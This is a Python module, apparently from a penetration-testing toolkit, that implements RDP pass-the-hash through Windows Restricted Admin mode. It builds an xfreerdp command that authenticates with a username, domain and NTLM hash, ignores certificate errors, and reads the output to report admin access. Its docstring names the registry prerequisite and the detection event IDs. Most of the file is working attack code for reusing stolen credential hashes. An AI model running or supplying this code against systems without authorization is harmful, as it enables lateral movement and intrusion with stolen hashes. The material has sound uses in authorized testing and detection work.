"""
RDP Pass-the-Hash using Restricted Admin mode
Requires specific configuration on target - but powerful when available
"""

import sys
from pathlib import Path
from typing import Optional, Tuple

# Add parent to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

from .base import BaseAuthMethod
from ..core.models import AuthMethod, AccessLevel, Credential
from ..utils.output import output


class RDPAuthMethod(BaseAuthMethod):
    """
    Pass-the-Hash via RDP using Restricted Admin mode

    RDP normally requires plaintext passwords. However, when
    Restricted Admin mode is enabled, PTH becomes possible.

    Requirements:
        - Restricted Admin mode enabled on target
        - Registry: HKLM\\System\\CurrentControlSet\\Control\\Lsa
        - Value: DisableRestrictedAdmin = 0

    Advantages:
        - GUI access to remote system
        - Can be used for interactive sessions
        - Uses legitimate RDP infrastructure

    Disadvantages:
        - Requires Restricted Admin (often disabled)
        - Creates RDP logs
        - Network defenders watch RDP closely

    Detection:
        - Event ID 4624 with LogonType 10 (RemoteInteractive)
        - Event ID 1149 in TerminalServices-RemoteConnectionManager
    """

    method = AuthMethod.RDP_PTH

    def __init__(self, timeout: int = 10):
        # Shorter timeout for RDP auth-only check
        super().__init__(timeout)

    def build_command(self, target: str, credential: Credential,
                      command: Optional[str] = None) -> str:
        """
        Build xfreerdp command for PTH

        Uses auth-only mode to test without establishing full session

        Args:
            target: Target IP or hostname
            credential: Credential with username, hash, domain
            command: Ignored for RDP (no command execution)

        Returns:
            xfreerdp command string
        """
        cmd = (
            f"xfreerdp "
            f"/u:{credential.username} "
            f"/d:{credential.domain} "
            f"/pth:{credential.ntlm_hash} "
            f"/v:{target} "
            f"/cert-ignore "
            f"+auth-only"
        )

        return cmd

    def authenticate(self, target: str, credential: Credential,
                     command: Optional[str] = None):
        """
        Override to add Restricted Admin warning
        """
        output.warning("Requires Restricted Admin mode enabled on target")
        output.info("This will attempt RDP authentication only (no GUI)")
        return super().authenticate(target, credential, command)

    def parse_output(self, output_text: str) -> Tuple[bool, AccessLevel, Optional[str]]:
        """
        Parse xfreerdp output

        Args:
            output_text: xfreerdp command output

        Returns:
            Tuple of (success, access_level, error_message)
        """
        output_lower = output_text.lower()

        # Success indicators
        if 'authentication only' in output_lower:
            return True, AccessLevel.ADMIN, None

        # Common failures
        if 'credssp' in output_lower:
            return False, AccessLevel.NONE, "CredSSP error - Restricted Admin may be disabled"

        if 'connect' in output_lower and 'error' in output_lower:
            return False, AccessLevel.NONE, "Connection failed"

        if 'authentication' in output_lower and 'failed' in output_lower:
            return False, AccessLevel.NONE, "Authentication failed"

        # If no clear indicators, likely failed
        return False, AccessLevel.NONE, "Restricted Admin may not be enabled"